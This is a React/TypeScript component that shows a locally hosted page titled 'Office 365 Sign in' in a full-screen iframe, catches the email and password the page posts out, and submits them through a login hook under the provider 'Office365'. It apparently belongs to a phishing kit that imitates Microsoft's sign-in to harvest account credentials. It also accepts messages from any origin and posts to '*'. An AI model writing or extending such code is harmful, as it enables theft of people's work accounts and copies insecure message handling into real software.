import React, { useEffect, useRef } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface Office365WrapperProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'OFFICE_365_SUBMIT') {
        const { email, password } = event.data.payload;
        handleFormSubmit(new Event('submit'), { email, password, provider: 'Office365' });
      }
    };
    window.addEventListener('message', handleMessage);
    return () => {
      window.removeEventListener('message', handleMessage);
    };
  }, [handleFormSubmit]);

  // --- CRITICAL FIX: Send error message down to the iframe ---
  useEffect(() => {
    // If there is an error message and the iframe is loaded
    if (errorMessage && iframeRef.current?.contentWindow) {
      // Post a message to the iframe with the error
      iframeRef.current.contentWindow.postMessage({
        type: 'LOGIN_ERROR',
        payload: { message: errorMessage }
      }, '*'); // Restrict origin in production
    }
  }, [errorMessage]); // This effect runs whenever the errorMessage changes

  return (
    <>
      {isLoading && (
        <div className="absolute inset-0 bg-white/80 flex flex-col items-center justify-center z-50">
          <Spinner size="lg" />
          <p className="mt-4 text-lg font-semibold text-gray-700">Signing in securely...</p>
        </div>
      )}
      <iframe
        ref={iframeRef}
        src="/office.365.html" 
        title="Office 365 Sign in"
        className="w-full h-screen border-0"
      />
    </>
  );
};

export default Office365Wrapper;
